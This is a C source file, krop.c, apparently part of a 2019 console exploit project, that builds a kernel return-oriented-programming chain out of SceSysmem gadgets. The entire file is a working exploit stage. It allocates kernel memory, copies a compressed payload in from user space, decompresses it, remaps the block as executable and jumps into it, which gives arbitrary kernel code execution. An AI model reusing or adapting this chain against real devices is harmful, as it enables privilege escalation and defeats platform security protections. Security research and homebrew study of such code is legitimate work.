/* krop.c -- kernel rop chain
 *
 * Copyright (C) 2019 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

#include <pspsdk.h>
#include <pspkernel.h>

#include <stdio.h>
#include <string.h>

#include "main.h"
#include "krop.h"
#include "rpc.h"
#include "rop.h"
#include "gadgets.h"

#include "payload.h"

// Variables that lie in the kernel stack
#define payload_temp_block        0x00
#define payload_temp_blockid      0x04
#define payload_code_block        0x08
#define payload_code_blockid      0x0c

// Max decompressed payload size
#define PAYLOAD_DECOMPRESSED_SIZE 0x100000

int build_krop(void *buf, int size, u32 sysmem_base, u32 kstack_base) {
  u32 payload_start = NATIVE(payload_bin_gz + 0xa); // skip gzip header
  u32 payload_size = sizeof(payload_bin_gz);

  register_base(3, sysmem_base);
  register_base(4, kstack_base);

  begin_rop(buf, size);

  // Allocate temporary block
  push(3, SceSysmem_pop_r0_r1_r2_r3_r4_pc);             // pc
  push(3, SceSysmem_empty_string);                      // r0
  push(0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW);          // r1
  push(0, (payload_size + 0xfff) & ~0xfff);             // r2
  push(0, 0);                                           // r3
  push(3, SceSysmem_ksceKernelAllocMemBlock);           // r4
  push(3, SceSysmem_blx_r4_pop_r4_pc);                  // pc
  push(4, payload_temp_blockid);                        // r4
  push(3, SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc);     // pc
  push(0, 0xDEADBEEF);                                  // r4

  // Get temporary block
  push(3, SceSysmem_pop_r0_r1_r2_r3_r4_pc);             // pc
  push(4, payload_temp_blockid);                        // r0
  push(4, payload_temp_block);                          // r1
  push(0, 0xDEADBEEF);                                  // r2
  push(3, SceSysmem_blx_r4_pop_r4_pc);                  // r3
  push(3, SceSysmem_ksceKernelGetMemBlockBase);         // r4
  push(3, SceSysmem_ldr_r0_r0_blx_r3);                  // pc
  push(0, 0xDEADBEEF);                                  // r4

  // Allocate code block
  push(3, SceSysmem_pop_r0_r1_r2_r3_r4_pc);             // pc
  push(3, SceSysmem_empty_string);                      // r0
  push(0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW);          // r1
  push(0, PAYLOAD_DECOMPRESSED_SIZE);                   // r2
  push(0, 0);                                           // r3
  push(3, SceSysmem_ksceKernelAllocMemBlock);           // r4
  push(3, SceSysmem_blx_r4_pop_r4_pc);                  // pc
  push(4, payload_code_blockid);                        // r4
  push(3, SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc);     // pc
  push(0, 0xDEADBEEF);                                  // r4

  // Get code block
  push(3, SceSysmem_pop_r0_r1_r2_r3_r4_pc);             // pc
  push(4, payload_code_blockid);                        // r0
  push(4, payload_code_block);                          // r1
  push(0, 0xDEADBEEF);                                  // r2
  push(3, SceSysmem_blx_r4_pop_r4_pc);                  // r3
  push(3, SceSysmem_ksceKernelGetMemBlockBase);         // r4
  push(3, SceSysmem_ldr_r0_r0_blx_r3);                  // pc
  push(0, 0xDEADBEEF);                                  // r4

  // Copy compressed payload from user to temporary block
  push(3, SceSysmem_pop_r0_r1_r2_r3_r4_pc);             // pc
  push(4, payload_temp_block);                          // r0
  push(0, payload_start);                               // r1
  push(0, payload_size);                                // r2
  push(3, SceSysmem_blx_r4_pop_r4_pc);                  // r3
  push(3, SceSysmem_ksceKernelMemcpyUserToKernel);      // r4
  push(3, SceSysmem_ldr_r0_r0_blx_r3);                  // pc
  push(0, 0xDEADBEEF);                                  // r4

  // Decompress payload to code block
  push(3, SceSysmem_pop_r3_r4_r5_pc);                   // pc
  push(3, SceSysmem_pop_pc);                            // r3
  push(3, SceSysmem_ksceDeflateDecompress);             // r4
  push(4, payload_temp_block - 0x14);                   // r5
  push(3, SceSysmem_ldr_r2_r5_14_blx_r3);               // pc
  push(3, SceSysmem_pop_r0_r1_pc);                      // pc
  push(4, payload_code_block);                          // r0
  push(0, PAYLOAD_DECOMPRESSED_SIZE);                   // r1
  push(3, SceSysmem_ldr_r0_r0_blx_r3);                  // pc
  push(3, SceSysmem_pop_r3_pc);                         // pc
  push(0, 0);                                           // r3
  push(3, SceSysmem_blx_r4_pop_r4_pc);                  // pc
  push(0, 0xDEADBEEF);                                  // r4

  // Free temporary block
  push(3, SceSysmem_pop_r0_r1_r2_r3_r4_pc);             // pc
  push(4, payload_temp_blockid);                        // r0
  push(0, 0xDEADBEEF);                                  // r1
  push(0, 0xDEADBEEF);                                  // r2
  push(3, SceSysmem_blx_r4_pop_r4_pc);                  // r3
  push(3, SceSysmem_ksceKernelFreeMemBlock);            // r4
  push(3, SceSysmem_ldr_r0_r0_blx_r3);                  // pc
  push(0, 0xDEADBEEF);                                  // r4

  // Mark code block as executable
  push(3, SceSysmem_pop_r0_r1_r2_r3_r4_pc);             // pc
  push(4, payload_code_blockid);                        // r0
  push(0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RX);          // r1
  push(0, 0xDEADBEEF);                                  // r2
  push(3, SceSysmem_blx_r4_pop_r4_pc);                  // r3
  push(3, SceSysmem_ksceKernelRemapBlock);              // r4
  push(3, SceSysmem_ldr_r0_r0_blx_r3);                  // pc
  push(0, 0xDEADBEEF);                                  // r4

  // Clean cache
  push(3, SceSysmem_pop_r0_r1_r2_r3_r4_pc);             // pc
  push(4, payload_code_block);                          // r0
  push(0, PAYLOAD_DECOMPRESSED_SIZE);                   // r1
  push(0, 0xDEADBEEF);                                  // r2
  push(3, SceSysmem_blx_r4_pop_r4_pc);                  // r3
  push(3, SceSysmem_ksceKernelCpuDcacheWritebackRange); // r4
  push(3, SceSysmem_ldr_r0_r0_blx_r3);                  // pc
  push(0, 0xDEADBEEF);                                  // r4

  // Execute payload
  push(3, SceSysmem_pop_r0_r1_r2_r3_r4_pc);             // pc
  push(4, payload_code_block);                          // r0
  push(3, 0);                                           // r1
  push(0, 0);                                           // r2
  push(3, SceSysmem_blx_r4_pop_r4_pc);                  // r3
  push(3, SceSysmem_adds_r0_1_bx_lr);                   // r4
  push(3, SceSysmem_ldr_r0_r0_blx_r3);                  // pc
  push(0, 0xDEADBEEF);                                  // r4
  push(3, SceSysmem_blx_r0);                            // pc

  return end_rop();
}
